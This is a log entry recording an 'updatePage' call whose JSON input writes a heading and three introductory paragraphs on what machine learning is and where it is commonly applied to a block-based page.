--- updatePage called at 2026-03-24T06:43:54.149Z ---
INPUT: {
  "pageId": "b5188c59-aaa9-4008-a453-2d38b44bb4db",
  "blockType": "blocks",
  "data": [
    {
      "type": "heading",
      "props": {
        "level": 1,
        "textColor": "default"
      },
      "content": "What is Machine Learning?"
    },
    {
      "type": "paragraph",
      "props": {
        "textColor": "default",
        "backgroundColor": "default",
        "textAlignment": "left"
      },
      "content": "Machine Learning (ML) is a subset of Artificial Intelligence (AI) that enables systems to learn from data, identify patterns, and make decisions with minimal human intervention. Instead of being explicitly programmed for every task, ML algorithms are designed to improve their performance over time as they are exposed to more data."
    },
    {
      "type": "paragraph",
      "props": {
        "textColor": "default",
        "backgroundColor": "default",
        "textAlignment": "left"
      },
      "content": "The core idea behind machine learning is to build algorithms that can 'learn' from data. This learning process typically involves feeding large datasets into a model, which then processes this information to find relationships, correlations, and structures. Based on these learned patterns, the model can then predict outcomes or classify new, unseen data."
    },
    {
      "type": "paragraph",
      "props": {
        "textColor": "default",
        "backgroundColor": "default",
        "textAlignment": "left"
      },
      "content": "Common applications of machine learning include image recognition, natural language processing (like virtual assistants), recommendation systems (e.g., Netflix, Amazon), fraud detection, and predictive analytics in various industries."
    }
  ]
}
